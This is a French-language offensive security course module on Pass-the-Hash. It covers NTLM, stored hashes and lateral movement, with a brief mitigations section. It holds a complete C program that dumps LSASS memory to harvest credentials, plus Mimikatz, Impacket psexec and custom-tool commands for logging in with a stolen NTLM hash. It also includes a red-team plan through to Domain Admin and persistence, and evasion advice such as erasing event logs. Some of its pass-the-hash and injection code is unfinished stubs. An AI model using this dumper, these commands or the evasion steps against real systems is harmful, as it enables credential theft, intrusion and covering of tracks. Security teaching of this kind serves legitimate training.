# Module W67 : Pass-the-Hash

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le protocole NTLM et ses faiblesses
- Extraire les hashes NTLM de la memoire
- Implementer un client Pass-the-Hash en C
- Utiliser cette technique pour le mouvement lateral

## 1. Comprendre l'Authentification NTLM

### 1.1 Le Probleme avec NTLM

Imaginez que pour entrer dans un batiment secure, au lieu de montrer votre carte d'identite, vous montrez une photocopie de votre signature. Si quelqu'un vole cette photocopie, il peut entrer aussi facilement que vous !

C'est exactement le probleme de NTLM : le hash du mot de passe est suffisant pour s'authentifier, pas besoin du mot de passe en clair.

```
AUTHENTIFICATION CLASSIQUE (Password):
User ──────> "MonMotDePasse123" ──────> Serveur
                                         ✓ Verifie

AUTHENTIFICATION NTLM (Hash):
User ──────> Hash(MonMotDePasse123) ───> Serveur
             = 8846f7eaee8fb117ad06bdd...  ✓ Accepte !

PROBLEME:
Attaquant ──> 8846f7eaee8fb117ad06bdd... ──> Serveur
             (meme hash vole)              ✓ Accepte !
```

### 1.2 Le Protocole NTLM - Fonctionnement

```
CLIENT                    SERVEUR
  │                          │
  │  1. NEGOTIATE            │
  ├─────────────────────────>│
  │  "Je veux m'authentifier"│
  │                          │
  │  2. CHALLENGE            │
  │<─────────────────────────┤
  │  Nonce: 0x123456789ABCDEF│
  │                          │
  │  3. AUTHENTICATE         │
  ├─────────────────────────>│
  │  Response = HMAC(hash,   │
  │             challenge)   │
  │                          │
  │  4. VALIDATION           │
  │<─────────────────────────┤
  │  ✓ Acces accorde         │
  └──────────────────────────┘
```

**Etapes detaillees :**

1. **Type 1 (NEGOTIATE)** : Le client annonce ses capacites
2. **Type 2 (CHALLENGE)** : Le serveur envoie un defi (nonce aleatoire)
3. **Type 3 (AUTHENTICATE)** : Le client repond avec : `HMAC-MD5(NT_Hash, Challenge)`
4. **Validation** : Le serveur verifie la reponse

### 1.3 Structure du Hash NTLM

```
Mot de passe: "Password123"
     │
     ▼
   MD4()
     │
     ▼
NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c

Stockage dans SAM/LSASS:
┌────────────────────────────────┐
│ Username: Administrator        │
│ LM Hash: (vide sur Win7+)      │
│ NT Hash: 8846f7eaee...586c     │
└────────────────────────────────┘
```

## 2. Extraction des Hashes NTLM

### 2.1 Ou Sont Stockes les Hashes ?

```
LOCALISATION DES HASHES WINDOWS:

1. SAM (Security Account Manager)
   ├─ Fichier: C:\Windows\System32\config\SAM
   └─ Chiffre avec la SYSKEY

2. LSASS.exe (Process memoire)
   ├─ Process ID: Variable
   ├─ Contient: Sessions actives
   └─ Hash en clair en memoire !

3. NTDS.dit (Active Directory)
   └─ Fichier: C:\Windows\NTDS\ntds.dit
```

### 2.2 Dump LSASS en C

```c
#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")

BOOL DumpLSASS(const wchar_t* outputFile) {
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;
    DWORD lsassPID = 0;
    BOOL success = FALSE;

    // 1. Trouver le PID de lsass.exe
    printf("[*] Recherche du processus lsass.exe...\n");
    lsassPID = FindProcessByName("lsass.exe");

    if (lsassPID == 0) {
        printf("[!] Impossible de trouver lsass.exe\n");
        return FALSE;
    }

    printf("[+] LSASS trouve - PID: %d\n", lsassPID);

    // 2. Activer SeDebugPrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        CloseHandle(hToken);
    }

    // 3. Ouvrir le processus LSASS
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (!hProcess) {
        printf("[!] OpenProcess failed: %d\n", GetLastError());
        return FALSE;
    }

    // 4. Creer le fichier de dump
    hFile = CreateFileW(
        outputFile,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[*] Dump du processus LSASS en cours...\n");

    // 5. Dumper la memoire avec MiniDumpWriteDump
    success = MiniDumpWriteDump(
        hProcess,
        lsassPID,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    if (success) {
        printf("[+] Dump LSASS reussi: %S\n", outputFile);
    } else {
        printf("[!] MiniDumpWriteDump failed: %d\n", GetLastError());
    }

    // Nettoyage
    CloseHandle(hFile);
    CloseHandle(hProcess);

    return success;
}

// Fonction helper pour trouver un processus
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    printf("=== LSASS Dumper ===\n\n");

    if (DumpLSASS(L"C:\\Temp\\lsass.dmp")) {
        printf("\n[*] Utilisez Mimikatz pour extraire les hashes:\n");
        printf("    mimikatz# sekurlsa::minidump lsass.dmp\n");
        printf("    mimikatz# sekurlsa::logonpasswords\n");
    }

    return 0;
}
```

## 3. Implementation Pass-the-Hash

### 3.1 Concept du PTH

```
SCENARIO PASS-THE-HASH:

1. EXTRACTION
   ┌──────────────┐
   │  Machine A   │
   │  (Compromise)│
   └──────┬───────┘
          │
          ├─> Dump LSASS
          │
          └─> Hash NTLM extrait:
              Admin: 8846f7eaee8fb117ad06bdd830b7586c

2. AUTHENTIFICATION LATERALE
   ┌──────────────┐         ┌──────────────┐
   │  Machine A   │─────────>│  Machine B   │
   │  (Attaquant) │  PTH!   │  (Cible)     │
   └──────────────┘         └──────────────┘
        │
        └─> Utilise le hash pour s'authentifier
            sans connaitre le mot de passe !
```

### 3.2 Code C : NTLM Challenge-Response

```c
#include <windows.h>
#include <stdio.h>
#define SECURITY_WIN32
#include <security.h>
#include <sspi.h>

#pragma comment(lib, "Secur32.lib")

typedef struct _NTLM_HASH {
    BYTE hash[16];
} NTLM_HASH;

// Structure pour stocker les credentials
typedef struct _PTH_CREDS {
    char username[256];
    char domain[256];
    NTLM_HASH ntlmHash;
} PTH_CREDS;

// Convertir une chaine hex en bytes
BOOL HexToBytes(const char* hexStr, BYTE* bytes, size_t length) {
    for (size_t i = 0; i < length; i++) {
        sscanf(&hexStr[i * 2], "%2hhx", &bytes[i]);
    }
    return TRUE;
}

// Afficher un hash en hex
void PrintHash(const char* label, BYTE* hash, size_t length) {
    printf("%s: ", label);
    for (size_t i = 0; i < length; i++) {
        printf("%02x", hash[i]);
    }
    printf("\n");
}

// Implementer la reponse NTLM
BOOL CalculateNTLMResponse(
    NTLM_HASH* ntlmHash,
    BYTE* serverChallenge,
    BYTE* response
) {
    // Dans une vraie implementation, utiliser HMAC-MD5
    // Pour simplifier, voici le concept:

    /*
    HMAC-MD5(
        Key = NT Hash,
        Data = Server Challenge
    ) = NTLMv1 Response

    Pour NTLMv2:
    HMAC-MD5(
        Key = HMAC-MD5(NT Hash, uppercase(username+domain)),
        Data = Challenge + Blob
    ) = NTLMv2 Response
    */

    // Implementation simplifiee (utiliser une vraie lib crypto)
    printf("[*] Calcul de la reponse NTLM...\n");
    PrintHash("NT Hash", ntlmHash->hash, 16);
    PrintHash("Server Challenge", serverChallenge, 8);

    // TODO: Implementation HMAC-MD5
    // Pour production, utiliser OpenSSL ou CryptoAPI

    return TRUE;
}

// Classe principale Pass-the-Hash
BOOL PassTheHash(PTH_CREDS* creds, const char* targetServer) {
    CredHandle credHandle;
    CtxtHandle contextHandle;
    TimeStamp lifetime;
    SecBufferDesc outBufferDesc;
    SecBuffer outBuffer;
    SECURITY_STATUS status;

    printf("\n=== Pass-the-Hash ===\n");
    printf("[*] Target: %s\n", targetServer);
    printf("[*] User: %s\\%s\n", creds->domain, creds->username);
    PrintHash("[*] NTLM Hash", creds->ntlmHash.hash, 16);

    // Preparer la structure d'authentification
    SEC_WINNT_AUTH_IDENTITY_A authIdentity;
    ZeroMemory(&authIdentity, sizeof(authIdentity));

    authIdentity.User = (unsigned char*)creds->username;
    authIdentity.UserLength = strlen(creds->username);
    authIdentity.Domain = (unsigned char*)creds->domain;
    authIdentity.DomainLength = strlen(creds->domain);

    // Ici on passerait normalement le hash, mais SSPI
    // n'expose pas directement cette fonctionnalite
    // Il faut utiliser des techniques plus avancees:
    // - Patcher LSASS (dangereux)
    // - Utiliser Kerberos avec le hash (Overpass-the-Hash)
    // - Implementer manuellement le protocole NTLM

    printf("\n[!] Note: Implementation complete necessite:\n");
    printf("    1. Injection dans LSASS ou\n");
    printf("    2. Implementation manuelle NTLM ou\n");
    printf("    3. Utilisation d'outils comme Mimikatz\n");

    return TRUE;
}

int main(int argc, char* argv[]) {
    PTH_CREDS creds;

    // Configuration des credentials
    strcpy(creds.username, "Administrator");
    strcpy(creds.domain, "CORP");

    // Hash NTLM (exemple)
    const char* hashStr = "8846f7eaee8fb117ad06bdd830b7586c";
    HexToBytes(hashStr, creds.ntlmHash.hash, 16);

    // Executer Pass-the-Hash
    PassTheHash(&creds, "\\\\192.168.1.10");

    return 0;
}
```

### 3.3 Alternative : Utiliser WinAPI avec Hash Injection

```c
#include <windows.h>
#include <stdio.h>

// Structure MSV1_0 pour l'authentification
typedef struct _MSV1_0_INTERACTIVE_LOGON {
    ULONG MessageType;
    UNICODE_STRING LogonDomainName;
    UNICODE_STRING UserName;
    UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON;

BOOL InjectHashIntoLSASS(PTH_CREDS* creds) {
    HANDLE hLsass = NULL;
    HANDLE hToken = NULL;
    DWORD lsassPID;

    printf("[*] Methode: Injection dans LSASS\n");

    // 1. Trouver LSASS
    lsassPID = FindProcessByName("lsass.exe");
    if (!lsassPID) {
        printf("[!] LSASS non trouve\n");
        return FALSE;
    }

    // 2. Ouvrir LSASS
    hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (!hLsass) {
        printf("[!] Impossible d'ouvrir LSASS: %d\n", GetLastError());
        return FALSE;
    }

    // 3. Allouer de la memoire dans LSASS
    SIZE_T regionSize = 0x1000;
    PVOID remoteMemory = VirtualAllocEx(
        hLsass,
        NULL,
        regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!remoteMemory) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hLsass);
        return FALSE;
    }

    printf("[+] Memoire allouee dans LSASS: 0x%p\n", remoteMemory);

    // 4. Injecter les credentials
    // Cette partie necessite de connaitre les structures internes
    // de LSASS et MSV1_0, ce qui est complexe et change selon
    // la version de Windows

    printf("[!] Injection complete necessiterait:\n");
    printf("    - Reverse engineering de LSASS\n");
    printf("    - Structures MSV1_0 internes\n");
    printf("    - Manipulation de la SSP (Security Support Provider)\n");

    // Nettoyage
    VirtualFreeEx(hLsass, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hLsass);

    return TRUE;
}
```

## 4. Techniques Avancees

### 4.1 Pass-the-Hash via SMB

```c
#include <windows.h>
#include <stdio.h>

BOOL ConnectToSMBWithHash(const char* target, PTH_CREDS* creds) {
    NETRESOURCEA nr;
    DWORD result;

    printf("[*] Connexion SMB a: %s\n", target);

    ZeroMemory(&nr, sizeof(nr));
    nr.dwType = RESOURCETYPE_ANY;
    nr.lpRemoteName = (LPSTR)target;

    // Tentative de connexion (necessite le hash injecte au prealable)
    result = WNetAddConnection2A(&nr, NULL, NULL, 0);

    if (result == NO_ERROR) {
        printf("[+] Connexion SMB reussie!\n");
        return TRUE;
    } else {
        printf("[!] Connexion echouee: %d\n", result);
        return FALSE;
    }
}
```

### 4.2 Overpass-the-Hash (Pass-the-Key)

```
OVERPASS-THE-HASH:
Utiliser le hash NTLM pour obtenir un ticket Kerberos

┌────────────────────┐
│  Hash NTLM         │
│  8846f7eaee...     │
└─────────┬──────────┘
          │
          ▼
    Demande TGT
          │
          ▼
┌────────────────────┐
│  Ticket Kerberos   │
│  (TGT)             │
└────────────────────┘
          │
          ▼
   Acces aux ressources
   (plus furtif que NTLM)
```

## 5. Applications Offensives

### 5.1 Scenario Red Team Complet

```
PHASE 1: COMPROMISE INITIAL
├─ Obtenir un shell utilisateur
└─ Executer DumpLSASS()

PHASE 2: EXTRACTION
├─ Dump LSASS.exe
├─ Extraire les hashes (Mimikatz/Pypykatz)
└─ Identifier les comptes a privileges

PHASE 3: LATERAL MOVEMENT
├─ Lister les machines du reseau
├─ Pour chaque machine:
│  ├─ Tester Pass-the-Hash
│  └─ Si succes -> Compromission
└─ Repeter jusqu'a Domain Admin

PHASE 4: PERSISTENCE
└─ Creer des backdoors avec les hashes obtenus
```

### 5.2 Outils et Commandes

```bash
# Avec Mimikatz (reference)
mimikatz# privilege::debug
mimikatz# sekurlsa::pth /user:Administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe

# Avec Impacket (Python)
python3 psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.10

# Avec notre outil C
.\pth.exe --user Administrator --domain CORP --hash 8846f7eaee8fb117ad06bdd830b7586c --target 192.168.1.10
```

### 5.3 Detection et Evasion

**Indicateurs de Detection :**
```
- Event ID 4624 (Type 3 - Network Logon) avec NTLM
- Event ID 4648 (Explicit credentials)
- Acces a LSASS.exe (Event ID 10)
- Creation de minidump de LSASS
- Connexions reseau anormales
```

**Techniques d'Evasion :**
```
1. Dump LSASS indirect:
   - Utiliser ProcDump (outil Microsoft legitime)
   - Dupliquer le handle LSASS
   - Dump via Task Manager (moins suspect)

2. Utiliser Kerberos au lieu de NTLM:
   - Overpass-the-Hash
   - Pass-the-Ticket

3. Nettoyer les logs:
   - Effacer les Event Logs
   - Utiliser des comptes de service (moins surveilles)

4. Timing:
   - Executer pendant les heures de maintenance
   - Espacer les tentatives
```

## 6. Defence et Mitigations

### 6.1 Protections

```
1. Desactiver NTLM:
   - Forcer Kerberos uniquement
   - Group Policy: Network Security: Restrict NTLM

2. Proteger LSASS:
   - Credential Guard (Windows 10+)
   - LSA Protection (RunAsPPL)
   - Windows Defender Credential Guard

3. Monitoring:
   - Surveiller les acces a LSASS
   - Alerter sur les Event ID critiques
   - Detecter les outils (Mimikatz signatures)

4. Segmentation:
   - Separer les reseaux
   - Limiter les acces administrateurs
   - Principe du moindre privilege
```

### 6.2 Detection du Dump LSASS

```c
// Code de detection (pour Blue Team)
BOOL DetectLSASSDump() {
    HANDLE hSnapshot;
    MODULEENTRY32 me32;
    BOOL detected = FALSE;

    // Enumerer les handles vers LSASS
    // Detecter les acces PROCESS_VM_READ
    // Alerter si dump en cours

    return detected;
}
```

## 7. Checklist Pass-the-Hash

```
[ ] Comprendre le protocole NTLM et ses faiblesses
[ ] Savoir dumper LSASS avec MiniDumpWriteDump
[ ] Extraire les hashes NTLM de la memoire
[ ] Implementer la reponse au challenge NTLM
[ ] Utiliser Pass-the-Hash pour SMB
[ ] Connaitre Overpass-the-Hash (Kerberos)
[ ] Implementer des techniques d'evasion
[ ] Comprendre les mitigations (Credential Guard)
[ ] Savoir nettoyer les traces
[ ] Connaitre les alternatives (Pass-the-Ticket)
```

## 8. Exercices

Voir [exercice.md](exercice.md)

## Ressources Complementaires

- MITRE ATT&CK: T1550.002 (Use Alternate Authentication Material: Pass the Hash)
- Harmj0y: Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy
- Microsoft: How Pass-the-Hash works
- Gentilkiwi: Mimikatz documentation

---

**Navigation**
- [Module precedent](../W66_credential_access/)
- [Module suivant](../W68_wmi_lateral/)
